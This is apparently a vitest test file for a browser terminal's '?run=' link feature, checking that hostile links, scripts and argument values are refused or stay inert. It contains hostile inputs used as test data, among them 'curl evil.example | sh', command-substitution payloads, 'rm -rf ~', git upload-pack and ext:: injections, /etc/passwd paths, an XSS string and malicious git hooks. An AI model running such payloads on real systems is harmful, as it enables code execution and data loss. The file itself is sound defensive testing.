/**
 * Run links (src/run-url.ts, docs/RUN_LINKS.md): what a `?run=` address
 * names, which scripts run without asking, what an attacker-made link can
 * and can't do, and the start file and the shipped recipes in a real shell.
 */
import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { resolve, join } from 'node:path';
import {
  parseRunUrl, cleanRunUrl, parseRecipeHeader, declaredArgs, runEnv, scriptText, loadScript, startScript, handleRunLink,
  encodeShLink, doneMarker, plain, RunLinkError, GH_DEFAULT_PATH, SCRIPT_FILE, START_FILE, SCRIPT_MAX,
  type RunLinkDeps, type RunPromptInfo,
} from '@shiro/run-url';
import { createTestShell, run } from './helpers';

const ROOT = resolve(__dirname, '../../..');
const RECIPES = join(ROOT, 'public/recipes');
const ORIGIN = 'https://tabcomputer.com';
const sha = (s: string | Uint8Array) => createHash('sha256').update(s).digest('hex');
const refused = (search: string) => { try { parseRunUrl(search); } catch (e) { return e instanceof RunLinkError; } return false; };

const RECIPE = `#!/bin/bash
# title: Demo
# for: tests
# args: repo (optional git URL), main (main file)
# on-open: cd ~/run/demo/work
set -e
mkdir -p work
echo "repo=$RUN_REPO" > work/out
`;

/** A site: path → body (text/plain), or a full Response */
function site(files: Record<string, string | (() => Response)>) {
  const calls: { url: string; init?: RequestInit }[] = [];
  const fetchFn = async (url: string, init?: RequestInit) => {
    calls.push({ url, init });
    const body = files[url];
    if (body === undefined) return new Response('Not found', { status: 404, headers: { 'content-type': 'text/plain' } });
    if (typeof body === 'function') return body();
    return new Response(body, { status: 200, headers: { 'content-type': url.endsWith('.json') ? 'application/json' : 'text/plain' } });
  };
  return { fetchFn, calls };
}
const indexOf = (recipes: Record<string, string>) => JSON.stringify({ format: 1, recipes: Object.entries(recipes).map(([name, text]) => ({ name, sha256: sha(text) })) });
const curatedSite = (extra: Record<string, string | (() => Response)> = {}) => site({
  [`${ORIGIN}/recipes/index.json`]: indexOf({ demo: RECIPE }),
  [`${ORIGIN}/recipes/demo.sh`]: RECIPE,
  ...extra,
});

describe('run links: what the address names', () => {
  it('has no run link without ?run', () => {
    expect(parseRunUrl('')).toBeNull();
    expect(parseRunUrl('?ui=terminal&repo=x')).toBeNull();
  });

  it('a bare name is a curated recipe, with the other parameters as its arguments', () => {
    const p = parseRunUrl('?run=c-class&repo=https://github.com/a/b&Main=x.tex&repo=second&ui=terminal&safe=0')!;
    expect(p.target).toEqual({ kind: 'recipe', name: 'c-class' });
    // The page's own parameters are never arguments; names are lower-cased; the first value wins
    expect(p.params).toEqual({ repo: 'https://github.com/a/b', main: 'x.tex' });
  });

  it('refuses names that could reach another file or host', () => {
    for (const bad of ['../x', '..', 'a/b', 'a/../../etc/passwd', '%2e%2e%2fx', 'c-class.sh', 'C-Class', 'a b', '', '.hidden', '-x',
      'http://evil.example/x', '//evil.example/x', 'evil.example', 'a\\b', 'a%00', 'a?x', 'a#x', 'a@b', 'x'.repeat(65),
      // gh- and sh- are the directories of scripts that aren't curated
      'gh', 'sh', 'gh-owner-repo', 'sh-0123456789ab', 'data:text/plain,echo', 'javascript:alert(1)', 'file:x', 'GH:a/b', 'https:a/b']) {
      expect(refused(`?run=${bad}`), bad).toBe(true);
    }
  });

  it('gh: names a file in a repository, .tabcomputer/run.sh by default', () => {
    expect(parseRunUrl('?run=gh:Owner/My.Repo')!.target).toEqual({ kind: 'gh', name: 'gh-owner-my-repo', owner: 'Owner', repo: 'My.Repo', path: GH_DEFAULT_PATH });
    expect(parseRunUrl('?run=gh:o/r/tools/setup.sh')!.target).toMatchObject({ kind: 'gh', name: 'gh-o-r-tools-setup-sh', path: 'tools/setup.sh' });
    for (const bad of ['gh:', 'gh:o', 'gh:o/', 'gh:/r', 'gh:o/..', 'gh:o/r/../../x/y/main/evil.sh', 'gh:o/r/a//b', 'gh:o/r/a/./b', 'gh:o/r/a?token=1', 'gh:o/r/a#b',
      'gh:o/r/a%2f..%2fb', 'gh:o/r/a\\b', 'gh:o@evil.example/r', 'gh:o:8080/r', 'gh:-o/r', 'gh:o/r/' + 'a/'.repeat(13) + 'x']) {
      expect(refused(`?run=${encodeURIComponent(bad)}`), bad).toBe(true);
    }
    // Every directory name is one a curated recipe can't have, and only [a-z0-9-]
    expect(parseRunUrl('?run=gh:o/...')!.target.name).toBe('gh-o');
  });

  it('sh: carries the script', () => {
    const link = encodeShLink('echo héllo\n');
    const t = parseRunUrl(`?run=${link}`)!.target;
    expect(t.kind).toBe('sh');
    expect(new TextDecoder().decode((t as { bytes: Uint8Array }).bytes)).toBe('echo héllo\n');
    for (const bad of ['sh:', 'sh:!!!', 'sh:a b', 'sh:' + 'A'.repeat(Math.ceil(SCRIPT_MAX * 4 / 3) + 8)]) expect(refused(`?run=${bad}`), bad.slice(0, 20)).toBe(true);
  });

  it('cleanRunUrl drops run and its arguments, and keeps the page’s own parameters and the hash', () => {
    expect(cleanRunUrl('https://tabcomputer.com/?run=c-class&repo=https://x/y&ui=terminal&profile=shiro#top')).toBe('https://tabcomputer.com/?ui=terminal&profile=shiro#top');
    expect(cleanRunUrl('https://tabcomputer.com/?RUN=x&run=gh:a/b&pip=numpy')).toBe('https://tabcomputer.com/');
    expect(parseRunUrl(new URL(cleanRunUrl('https://tabcomputer.com/?run=c-class&repo=x')).search)).toBeNull();
  });
});

describe('run links: headers and arguments', () => {
  it('reads the header comment block, and stops at the first command', () => {
    const h = parseRecipeHeader(RECIPE + '# title: Not this one\n# on-open: rm -rf ~\n');
    expect(h).toEqual({ title: 'Demo', for: 'tests', args: 'repo (optional git URL), main (main file)', 'on-open': 'cd ~/run/demo/work' });
    expect(parseRecipeHeader('echo hi\n# on-open: evil\n')).toEqual({});
    // Prose with a colon is not a key
    expect(parseRecipeHeader('#!/bin/sh\n# note: x\n# This tab has: nothing\n# title: T\n')).toEqual({ title: 'T' });
  });

  it('declares arguments by name', () => {
    expect(declaredArgs('repo (optional git URL), main (main .tex file, default main.tex)')).toEqual(['repo', 'main']);
    expect(declaredArgs('url (optional: archive or git URL; or drop a file)')).toEqual(['url']);
    // Not the page's own parameters, not names that aren't variable names
    expect(declaredArgs('safe, run, profile, 1x, a-b, PATH (x), ok_1')).toEqual(['path', 'ok_1']);
    expect(declaredArgs(undefined)).toEqual([]);
  });

  it('only declared arguments become RUN_ variables; values stay data', () => {
    const header = parseRecipeHeader(RECIPE);
    const hostile = '$(touch /tmp/pwned); `id` && rm -rf ~ | "x" \'y\' > /etc/passwd #';
    const { env, ignored } = runEnv({ repo: hostile, path: '/evil', ld_preload: 'x', 'bad key': 'v', 'a=b': 'v' }, header);
    expect(env).toEqual({ RUN_REPO: hostile });
    expect(ignored.sort()).toEqual(['a=b', 'bad key', 'ld_preload', 'path']);
    // Every name is RUN_ + [A-Z0-9_]: a link can't set PATH, HOME or LD_PRELOAD
    for (const k of Object.keys(runEnv({ repo: 'a', main: 'b' }, header).env)) expect(k).toMatch(/^RUN_[A-Z][A-Z0-9_]*$/);
  });

  it('refuses values that could change what the terminal shows', () => {
    const header = parseRecipeHeader(RECIPE);
    for (const bad of ['a\nrm -rf ~', 'a\rb', 'a\x1b]52;c;ZWNobw==\x07', 'a\x1b[2Jb', 'a\tb', 'a\0b', 'a‮b', 'a b', 'a\x9bb', 'x'.repeat(2001)]) {
      expect(() => runEnv({ repo: bad }, header), JSON.stringify(bad).slice(0, 24)).toThrow(RunLinkError);
    }
    // An undeclared one is dropped, not looked at
    expect(runEnv({ other: 'a\nb' }, header)).toEqual({ env: {}, ignored: ['other'] });
  });

  it('refuses scripts whose text could differ from what is shown', () => {
    const enc = (s: string) => new TextEncoder().encode(s);
    expect(scriptText(enc('﻿echo a\r\necho b'))).toBe('echo a\necho b\n');
    for (const bad of ['echo a\recho b\n', 'echo \x1b[8mhidden\x1b[0m\n', 'echo a ‮# b\n', 'echo​ a\n', 'a\0b\n', '   \n']) {
      expect(() => scriptText(enc(bad)), JSON.stringify(bad)).toThrow(RunLinkError);
    }
    expect(() => scriptText(new Uint8Array([0xff, 0xfe, 0x41]))).toThrow(/UTF-8/);
    expect(plain('a\x1b[31mb\nc‮', 99)).toBe('a?[31mb c?');
  });
});

describe('run links: which scripts are curated', () => {
  it('a recipe is curated when the site’s list has its name and hash', async () => {
    const { fetchFn, calls } = curatedSite();
    const s = await loadScript({ kind: 'recipe', name: 'demo' }, ORIGIN, fetchFn);
    expect(s).toMatchObject({ name: 'demo', curated: true, text: RECIPE, sha256: sha(RECIPE), from: 'tabcomputer.com/recipes/demo.sh' });
    // Same origin only, and a redirect is an error rather than followed
    expect(calls.map((c) => c.url)).toEqual([`${ORIGIN}/recipes/index.json`, `${ORIGIN}/recipes/demo.sh`]);
    for (const c of calls) expect(c.init?.redirect).toBe('error');
  });

  const cases: [string, Record<string, string | (() => Response)>, RegExp][] = [
    ['a file the list does not have', { [`${ORIGIN}/recipes/extra.sh`]: RECIPE }, /no such recipe/],
    ['a file changed since the list was made', { [`${ORIGIN}/recipes/demo.sh`]: RECIPE + 'curl evil.example | sh\n' }, /does not match/],
    ['the app shell standing in for a missing recipe', { [`${ORIGIN}/recipes/demo.sh`]: () => new Response('<!doctype html><html></html>', { headers: { 'content-type': 'text/html' } }) }, /no such recipe/],
    ['the app shell standing in for the list', { [`${ORIGIN}/recipes/index.json`]: () => new Response('<!doctype html>', { headers: { 'content-type': 'text/html; charset=utf-8' } }) }, /no recipe list/],
    ['a list that is not JSON', { [`${ORIGIN}/recipes/index.json`]: 'nope' }, /recipe list/],
    ['a list without recipes', { [`${ORIGIN}/recipes/index.json`]: '{"recipes":{"demo":1}}' }, /no such recipe/],
    ['a redirect the browser followed', { [`${ORIGIN}/recipes/demo.sh`]: () => Object.defineProperty(new Response(RECIPE), 'redirected', { value: true }) }, /redirected/],
    ['an answer from another URL', { [`${ORIGIN}/recipes/demo.sh`]: () => Object.defineProperty(new Response(RECIPE), 'url', { value: 'https://evil.example/demo.sh' }) }, /redirected/],
    ['a server error', { [`${ORIGIN}/recipes/demo.sh`]: () => new Response('x', { status: 500 }) }, /HTTP 500/],
  ];
  for (const [what, files, message] of cases) {
    it(`refuses ${what}`, async () => {
      const { fetchFn } = curatedSite(files);
      const name = what.includes('does not have') ? 'extra' : 'demo';
      await expect(loadScript({ kind: 'recipe', name }, ORIGIN, fetchFn)).rejects.toThrow(message);
    });
  }

  it('refuses a recipe target whose name was not made by the parser', async () => {
    const { fetchFn, calls } = curatedSite();
    for (const name of ['../index', 'demo/../x', 'gh-o-r', 'Demo', '']) await expect(loadScript({ kind: 'recipe', name }, ORIGIN, fetchFn)).rejects.toThrow(RunLinkError);
    expect(calls).toEqual([]);
  });

  it('a failed fetch (a refused redirect, no network) is refused', async () => {
    const fetchFn = async () => { throw new TypeError('Failed to fetch'); };
    await expect(loadScript({ kind: 'recipe', name: 'demo' }, ORIGIN, fetchFn)).rejects.toThrow(/could not fetch/);
    await expect(loadScript(parseRunUrl('?run=gh:o/r')!.target, ORIGIN, fetchFn)).rejects.toThrow(/could not fetch/);
  });

  it('gh: fetches the default branch from raw.githubusercontent.com and is never curated', async () => {
    const url = 'https://raw.githubusercontent.com/o/r/HEAD/.tabcomputer/run.sh';
    const { fetchFn, calls } = site({ [url]: RECIPE });
    const s = await loadScript(parseRunUrl('?run=gh:o/r')!.target, ORIGIN, fetchFn);
    expect(s).toMatchObject({ name: 'gh-o-r', curated: false, text: RECIPE, from: 'github.com/o/r, .tabcomputer/run.sh' });
    expect(calls).toHaveLength(1);
    expect(calls[0].url).toBe(url);
    expect(calls[0].init).toMatchObject({ credentials: 'omit', redirect: 'error' });
    await expect(loadScript(parseRunUrl('?run=gh:o/missing')!.target, ORIGIN, fetchFn)).rejects.toThrow(/does not exist/);
    // Even a copy of a curated recipe, even in a repository named like the site
    const copy = site({ 'https://raw.githubusercontent.com/tabcomputer/recipes/HEAD/demo.sh': RECIPE });
    expect((await loadScript(parseRunUrl('?run=gh:tabcomputer/recipes/demo.sh')!.target, ORIGIN, copy.fetchFn)).curated).toBe(false);
  });

  it('sh: is never curated, and its directory is named after its hash', async () => {
    const { fetchFn, calls } = site({});
    const text = 'echo hi\n';
    const s = await loadScript(parseRunUrl(`?run=${encodeShLink(text)}`)!.target, ORIGIN, fetchFn);
    expect(s).toMatchObject({ curated: false, text, name: `sh-${sha(text).slice(0, 12)}`, from: 'the link itself' });
    expect(calls).toEqual([]);
  });
});

/** handleRunLink's surroundings, recording what it did */
function harness(search: string, fetchFn: RunLinkDeps['fetch'], over: Partial<RunLinkDeps> = {}, answer = false) {
  const files = new Map<string, string>();
  const log = { cleaned: 0, prompts: [] as RunPromptInfo[], terminals: [] as Parameters<RunLinkDeps['openTerminal']>[0][], reports: [] as string[] };
  const deps: RunLinkDeps = {
    search, origin: ORIGIN, home: '/home/user', framed: false, fetch: fetchFn,
    fs: {
      mkdir: async () => {},
      writeFile: async (p, d) => { files.set(p, d); },
      exists: async (p) => files.has(p),
    },
    cleanUrl: () => { log.cleaned++; },
    confirm: async (info) => { log.prompts.push(info); return answer; },
    openTerminal: (o) => { log.terminals.push(o); },
    report: (m) => { log.reports.push(m); },
    ...over,
  };
  return { deps, files, log };
}

describe('run links: the trust decision', () => {
  it('a curated recipe runs at once, without a prompt', async () => {
    const { fetchFn } = curatedSite();
    const hostile = '$(touch /tmp/pwned); echo "x" `id`';
    const h = harness(`?run=demo&repo=${encodeURIComponent(hostile)}&utm_source=mail`, fetchFn);
    expect(await handleRunLink(h.deps)).toBe('ran');
    expect(h.log.prompts).toEqual([]);
    expect(h.log.cleaned).toBe(1);
    expect(h.log.terminals).toHaveLength(1);
    const t = h.log.terminals[0];
    // The value travels in the environment; the typed line and the start file never hold it
    expect(t).toEqual({ cwd: '/home/user/run/demo', command: `. ~/run/demo/${START_FILE}`, env: { RUN_REPO: hostile }, title: 'Demo' });
    expect(h.files.get(`/home/user/run/demo/${SCRIPT_FILE}`)).toBe(RECIPE);
    const start = h.files.get(`/home/user/run/demo/${START_FILE}`)!;
    expect(start).not.toContain('pwned');
    expect(start).toContain("echo 'running recipe demo (tabcomputer.com/recipes/demo.sh)'");
    expect(start).toContain('ignored utm_source');
  });

  it('gh: and sh: ask first, and Cancel runs and writes nothing', async () => {
    const gh = site({ 'https://raw.githubusercontent.com/o/r/HEAD/.tabcomputer/run.sh': RECIPE });
    for (const [search, fetchFn] of [['?run=gh:o/r&repo=x', gh.fetchFn], [`?run=${encodeShLink(RECIPE)}&repo=x`, site({}).fetchFn]] as const) {
      const h = harness(search, fetchFn, {}, false);
      expect(await handleRunLink(h.deps)).toBe('cancelled');
      expect(h.log.prompts).toHaveLength(1);
      // The prompt gets the whole script and what the link sets
      expect(h.log.prompts[0]).toMatchObject({ script: RECIPE, env: { RUN_REPO: 'x' } });
      expect(h.log.terminals).toEqual([]);
      expect(h.files.size).toBe(0);
      expect(h.log.cleaned).toBe(1);
    }
  });

  it('Run starts exactly the script that was shown', async () => {
    const gh = site({ 'https://raw.githubusercontent.com/o/r/HEAD/.tabcomputer/run.sh': RECIPE });
    const h = harness('?run=gh:o/r', gh.fetchFn, {}, true);
    expect(await handleRunLink(h.deps)).toBe('ran');
    expect(h.files.get(`/home/user/run/gh-o-r/${SCRIPT_FILE}`)).toBe(h.log.prompts[0].script);
    expect(gh.calls).toHaveLength(1); // not fetched again after the prompt
    expect(h.log.terminals[0]).toMatchObject({ cwd: '/home/user/run/gh-o-r', command: `. ~/run/gh-o-r/${START_FILE}`, title: 'gh-o-r' });
    expect(h.files.get(`/home/user/run/gh-o-r/${START_FILE}`)).toContain("echo 'running script gh-o-r (github.com/o/r, .tabcomputer/run.sh)'");
  });

  it('a second load only runs on-open; a script that isn’t curated asks again', async () => {
    const { fetchFn } = curatedSite();
    const h = harness('?run=demo', fetchFn);
    h.files.set(`/home/user/run/demo/${doneMarker(sha(RECIPE))}`, '');
    expect(await handleRunLink(h.deps)).toBe('on-open');
    const start = h.files.get(`/home/user/run/demo/${START_FILE}`)!;
    expect(start).not.toContain(SCRIPT_FILE);
    expect(start).toContain('cd ~/run/demo/work');
    expect(start).toContain('already set up here');
    // A changed recipe has another hash: it runs again
    const changed = RECIPE + 'echo more\n';
    const again = harness('?run=demo', site({ [`${ORIGIN}/recipes/index.json`]: indexOf({ demo: changed }), [`${ORIGIN}/recipes/demo.sh`]: changed }).fetchFn);
    again.files.set(`/home/user/run/demo/${doneMarker(sha(RECIPE))}`, '');
    expect(await handleRunLink(again.deps)).toBe('ran');

    const gh = site({ 'https://raw.githubusercontent.com/o/r/HEAD/.tabcomputer/run.sh': RECIPE });
    const u = harness('?run=gh:o/r', gh.fetchFn, {}, false);
    u.files.set(`/home/user/run/gh-o-r/${doneMarker(sha(RECIPE))}`, '');
    expect(await handleRunLink(u.deps)).toBe('cancelled');
    expect(u.log.prompts[0].onOpenOnly).toBe('cd ~/run/demo/work');
    expect(u.log.terminals).toEqual([]);
  });

  it('refuses, cleans the address and says why', async () => {
    const { fetchFn, calls } = curatedSite();
    const refusals: [string, Partial<RunLinkDeps>, RegExp][] = [
      ['?run=../../etc/passwd', {}, /no such recipe/],
      ['?run=nope', {}, /no such recipe/],
      ['?run=demo&repo=a%0Ab', {}, /control characters/],
      ['?run=demo', { framed: true }, /frame/],
      ['?run=gh:o/r/../x', {}, /path/],
      ['?run=sh:', {}, /base64url/],
    ];
    for (const [search, over, why] of refusals) {
      const h = harness(search, fetchFn, over, true);
      expect(await handleRunLink(h.deps), search).toBe('refused');
      expect(h.log.reports).toHaveLength(1);
      expect(h.log.reports[0]).toMatch(why);
      expect(h.log.terminals).toEqual([]);
      expect(h.files.size).toBe(0);
      expect(h.log.cleaned).toBe(1);
    }
    // A framed page doesn't even fetch
    const before = calls.length;
    await handleRunLink(harness('?run=demo', fetchFn, { framed: true }).deps);
    expect(calls.length).toBe(before);
    // No run link: nothing happens, the address is left alone
    const none = harness('?ui=terminal', fetchFn);
    expect(await handleRunLink(none.deps)).toBe('none');
    expect(none.log.cleaned).toBe(0);
  });

  it('what a refusal says has nothing from the link in it', async () => {
    const h = harness('?run=' + encodeURIComponent('\x1b]0;owned\x07<img src=x onerror=alert(1)>'), curatedSite().fetchFn);
    await handleRunLink(h.deps);
    expect(h.log.reports[0]).not.toMatch(/owned|img|\x1b/);
  });

  it('a script’s own text can’t break out of the start file’s first line', () => {
    const start = startScript({ name: 'gh-o-r', curated: false, from: "x'; touch /tmp/pwned; echo '\x1b[2J", sha256: 'ab'.repeat(32), done: false, ignored: ["k'; id; '"] });
    expect(start).toContain(`echo 'running script gh-o-r (x'\\''; touch /tmp/pwned; echo '\\''?[2J)'`);
    expect(start).toContain(`ignored k'\\''; id; '\\''`);
  });
});

/** A shell on an empty machine (createTestShell's filesystem is the same one every time) */
async function freshShell() {
  const t = await createTestShell();
  await run(t.shell, 'rm -rf /home/user/run /tmp/calls /tmp/pwned /tmp/pwned2 /tmp/pwned3 /tmp/src');
  return t;
}

describe('run links: the start file in a real shell', () => {
  async function setup(script: string, done = false) {
    const { fs, shell } = await freshShell();
    const header = parseRecipeHeader(script);
    const sha256 = sha(script);
    await fs.mkdir('/home/user/run/demo', { recursive: true });
    await fs.writeFile(`/home/user/run/demo/${SCRIPT_FILE}`, script);
    await fs.writeFile(`/home/user/run/demo/${START_FILE}`, startScript({ name: 'demo', curated: true, from: 'tabcomputer.com/recipes/demo.sh', sha256, onOpen: header['on-open'], done, ignored: [] }));
    shell.cwd = '/home/user/run/demo';
    return { fs, shell, marker: `/home/user/run/demo/${doneMarker(sha256)}` };
  }

  it('runs the script in ~/run/<name> with RUN_ set, leaves the marker, then on-open in the terminal’s shell', async () => {
    const { fs, shell, marker } = await setup(RECIPE);
    const hostile = '$(touch /tmp/pwned); echo "x" `touch /tmp/pwned2` \'q\' && rm -rf ~/run > /tmp/pwned3 #';
    shell.env['RUN_REPO'] = hostile;
    const r = await run(shell, `. ~/run/demo/${START_FILE}`);
    expect(r.output).toContain('running recipe demo (tabcomputer.com/recipes/demo.sh)');
    expect(r.exitCode).toBe(0);
    // The value arrived whole, and nothing in it ran
    expect(await fs.readFile('/home/user/run/demo/work/out', 'utf8')).toBe(`repo=${hostile}\n`);
    for (const p of ['/tmp/pwned', '/tmp/pwned2', '/tmp/pwned3']) expect(await fs.exists(p), p).toBe(false);
    expect(await fs.exists(marker)).toBe(true);
    expect(shell.cwd).toBe('/home/user/run/demo/work');
    expect(shell.env['__run_status']).toBeUndefined();
  });

  it('a script that fails leaves no marker and skips on-open; its set -e and cd stay in the subshell', async () => {
    const { fs, shell, marker } = await setup('#!/bin/bash\n# on-open: touch /home/user/run/demo/opened\nset -e\ncd /tmp\nfalse\necho not reached\n');
    const r = await run(shell, `. ~/run/demo/${START_FILE}`);
    expect(r.output).toContain('stopped with status 1');
    expect(r.output).not.toContain('not reached');
    expect(r.exitCode).toBe(1);
    expect(await fs.exists(marker)).toBe(false);
    expect(await fs.exists('/home/user/run/demo/opened')).toBe(false);
    expect(shell.cwd).toBe('/home/user/run/demo');
    // The terminal's shell is still usable: no errexit leaked into it
    expect((await run(shell, 'false; echo still here')).output).toContain('still here');
  });

  it('once done, only on-open runs', async () => {
    const { fs, shell } = await setup(RECIPE, true);
    await fs.mkdir('/home/user/run/demo/work', { recursive: true });
    const r = await run(shell, `. ~/run/demo/${START_FILE}`);
    expect(r.output).toContain('recipe demo (tabcomputer.com/recipes/demo.sh) is already set up here');
    expect(await fs.exists('/home/user/run/demo/work/out')).toBe(false);
    expect(shell.cwd).toBe('/home/user/run/demo/work');
  });
});

describe('the shipped recipes', () => {
  const names = readdirSync(RECIPES).filter((f) => f.endsWith('.sh')).map((f) => f.slice(0, -3)).sort();
  const index = JSON.parse(readFileSync(join(RECIPES, 'index.json'), 'utf8')) as { recipes: Record<string, string>[] };

  it('index.json matches the files (node scripts/recipes/gen-index.mjs)', () => {
    expect(index.recipes.map((r) => r.name)).toEqual(names);
    for (const r of index.recipes) {
      const bytes = readFileSync(join(RECIPES, `${r.name}.sh`));
      const { name, sha256, ...header } = r;
      expect(sha256, name).toBe(sha(bytes));
      expect(header, name).toEqual(parseRecipeHeader(bytes.toString('utf8')));
    }
  });

  it('each is a script the runner accepts, with a title, who it is for, and names a link can use', () => {
    for (const name of names) {
      const bytes = readFileSync(join(RECIPES, `${name}.sh`));
      const text = scriptText(bytes);
      const h = parseRecipeHeader(text);
      expect(parseRunUrl(`?run=${name}`)!.target, name).toEqual({ kind: 'recipe', name });
      expect(text.startsWith('#!/bin/bash\n'), name).toBe(true);
      expect(h.title, name).toBeTruthy();
      expect(h.for, name).toBeTruthy();
      // Nothing from the private notes they were drafted in
      expect(text, name).not.toMatch(/LEADS|leads\//);
      // on-open stays in the recipe's own directory
      if (h['on-open']) expect(h['on-open'], name).toMatch(new RegExp(`^cd ~/run/${name}(/work)?$`));
      // Every RUN_ variable it reads is declared, or the runner would never set it
      const used = [...text.matchAll(/RUN_([A-Z0-9_]+)/g)].map((m) => m[1].toLowerCase());
      for (const u of used) expect(declaredArgs(h.args), `${name}: RUN_${u.toUpperCase()}`).toContain(u);
    }
  });

  /** Run a recipe as the start file does, with the programs it would install or fetch replaced by recorders */
  async function runRecipe(name: string, env: Record<string, string> = {}, before = '') {
    const { fs, shell } = await freshShell();
    const text = readFileSync(join(RECIPES, `${name}.sh`), 'utf8');
    const dir = `/home/user/run/${name}`;
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(`${dir}/${SCRIPT_FILE}`, text);
    await fs.writeFile(`${dir}/${START_FILE}`, startScript({ name, curated: true, from: `tabcomputer.com/recipes/${name}.sh`, sha256: sha(text), onOpen: parseRecipeHeader(text)['on-open'], done: false, ignored: [] }));
    Object.assign(shell.env, env);
    const rec = (cmd: string) => `${cmd}() { echo "${cmd} $*" >> /tmp/calls; }`;
    await run(shell, [
      'toolchain() { if [ "$1" = list ]; then echo "c        no"; echo "python   no"; else echo "toolchain $*" >> /tmp/calls; fi; }',
      rec('git'), rec('sudo'), rec('debian'), rec('curl'), rec('latexmk'), rec('python3'), rec('pip'), before,
    ].filter(Boolean).join('\n'));
    const r = await run(shell, `. ~/run/${name}/${START_FILE}`);
    const calls = (await fs.readFile('/tmp/calls', 'utf8').catch(() => '')) as string;
    return { fs, shell, r, calls: calls.split('\n').filter(Boolean), done: await fs.exists(`${dir}/${doneMarker(sha(text))}`) };
  }
  const HOSTILE = ['--upload-pack=touch /tmp/pwned', '-o/tmp/pwned', 'file:///etc/passwd', 'ext::sh -c touch% /tmp/pwned', 'http://plain.example/x', '$(touch /tmp/pwned)', '; touch /tmp/pwned', '../../etc'];

  it('c-class installs the toolchain and leaves a hello.c', async () => {
    const t = await runRecipe('c-class');
    expect(t.r.exitCode, t.r.output).toBe(0);
    expect(t.calls).toEqual(['toolchain install c']);
    expect(await t.fs.readFile('/home/user/run/c-class/work/hello.c', 'utf8')).toContain('hello from tabcomputer');
    expect(t.shell.cwd).toBe('/home/user/run/c-class/work');
    expect(t.done).toBe(true);
  });

  it('the classes, the sandbox and the paper clone only an https repository, and run nothing from it', async () => {
    for (const name of ['c-class', 'python-class', 'claude-sandbox', 'latex-paper']) {
      const ok = await runRecipe(name, { RUN_REPO: 'https://github.com/teacher/starter' });
      expect(ok.r.exitCode, `${name}: ${ok.r.output}`).toBe(0);
      expect(ok.calls.filter((c) => c.startsWith('git')), name).toEqual(['git clone -- https://github.com/teacher/starter .']);
      // Nothing was built or installed from what the link named
      expect(ok.calls.filter((c) => /^(latexmk|python3|pip|sudo|curl)/.test(c)), name).toEqual([]);
      for (const repo of HOSTILE) {
        const t = await runRecipe(name, { RUN_REPO: repo });
        expect(t.calls.filter((c) => c.startsWith('git')), `${name} ${repo}`).toEqual([]);
        expect(t.r.output, `${name} ${repo}`).toContain('must be an https:// URL');
        expect(await t.fs.exists('/tmp/pwned'), `${name} ${repo}`).toBe(false);
      }
    }
  });

  it('python-class suggests packages instead of installing them, and only plain names', async () => {
    const ok = await runRecipe('python-class', { RUN_PIP: 'numpy pandas matplotlib' });
    expect(ok.calls).toEqual(['toolchain install python']);
    expect(ok.r.output).toContain('python3 -m pip install --user --break-system-packages numpy pandas matplotlib');
    for (const pip of ['--index-url=evil numpy', 'numpy -r /etc/passwd', 'numpy; curl evil.example | sh', 'numpy && id', '$(id)', 'git+https://evil.example/x', 'numpy\\ x', '`id`']) {
      const t = await runRecipe('python-class', { RUN_PIP: pip });
      expect(t.r.output, pip).toContain('not plain package names');
      expect(t.r.output, pip).not.toContain('To install them');
      expect(t.calls, pip).toEqual(['toolchain install python']);
    }
  });

  it('latex-paper names the build command, and only for a plain file name', async () => {
    const t = await runRecipe('latex-paper', { RUN_MAIN: 'thesis.tex' }, 'mkdir -p ~/run/latex-paper/work; echo x > ~/run/latex-paper/work/thesis.tex');
    expect(t.calls).toEqual(['toolchain install tex']);
    expect(t.r.output).toContain('latexmk -pdf -interaction=nonstopmode thesis.tex');
    for (const main of ['-shell-escape', '/etc/passwd', '../../x.tex', 'a.tex; id', '$(id).tex', 'a b.tex']) {
      const bad = await runRecipe('latex-paper', { RUN_MAIN: main });
      expect(bad.r.exitCode, main).toBe(0);
      expect(bad.r.output, main).toContain('latexmk -pdf main.tex');
      expect(bad.r.output, main).not.toContain(main);
    }
  });

  it('untrusted-repo fetches, lists and reports; it unpacks and runs nothing', async () => {
    const repo = await runRecipe('untrusted-repo', { RUN_URL: 'https://github.com/someone/take-home' });
    expect(repo.r.exitCode, repo.r.output).toBe(0);
    expect(repo.calls).toEqual(['git -c core.hooksPath=/dev/null clone --no-checkout -- https://github.com/someone/take-home box/repo']);
    const archive = await runRecipe('untrusted-repo', { RUN_URL: 'https://files.example/project.tar.gz' });
    expect(archive.calls).toEqual(['curl -fsSL -o in/archive https://files.example/project.tar.gz']);
    for (const url of HOSTILE) {
      const t = await runRecipe('untrusted-repo', { RUN_URL: url });
      expect(t.calls, url).toEqual([]);
      expect(t.r.output, url).toContain('must be an https:// URL');
    }
    // A tarball in ./in is listed, not unpacked; a hook in a clone is reported
    const t = await runRecipe('untrusted-repo', {}, [
      'mkdir -p ~/run/untrusted-repo/in ~/run/untrusted-repo/box/repo/.git/hooks /tmp/src',
      'echo evil > /tmp/src/payload.sh; tar -cf ~/run/untrusted-repo/in/a.tar -C /tmp/src payload.sh',
      'echo "#!/bin/sh" > ~/run/untrusted-repo/box/repo/.git/hooks/post-checkout',
      'printf "[core]\\n\\tfsmonitor = ./evil.sh\\n" > ~/run/untrusted-repo/box/repo/.git/config',
    ].join('\n'));
    expect(t.r.exitCode, t.r.output).toBe(0);
    expect(t.r.output).toContain('payload.sh');
    expect(await t.fs.exists('/home/user/run/untrusted-repo/box/payload.sh')).toBe(false);
    expect(t.r.output).toContain('box/repo/.git/hooks/post-checkout');
    expect(t.r.output).toMatch(/config:\d+:.*fsmonitor/);
  });

  it('wordperfect-rescue installs the converters through Debian and writes convert-all', async () => {
    const t = await runRecipe('wordperfect-rescue', {}, 'debian() { echo "debian $*" >> /tmp/calls; [ "$1" != status ]; }');
    expect(t.r.exitCode, t.r.output).toBe(0);
    expect(t.calls).toEqual(['debian status', 'debian install', 'sudo apt-get update', 'sudo apt-get install -y libwpd-tools libmwaw-tools libvisio-tools libcdr-tools']);
    const script = await t.fs.readFile('/home/user/run/wordperfect-rescue/convert-all', 'utf8') as string;
    expect(script).toContain('case "${f,,}" in');
    expect(script).toContain('wpd2html "$f" > "$b.html"');
    // convert-all itself, with the converters standing in
    const r = await run(t.shell, [
      'wpd2html() { echo "html of $1"; }',
      'echo x > in/Letter.WPD; echo x > in/notes.txt',
      '. ./convert-all',
      'cat out/Letter.html',
    ].join('\n'));
    expect(r.output).toContain('ok   in/Letter.WPD');
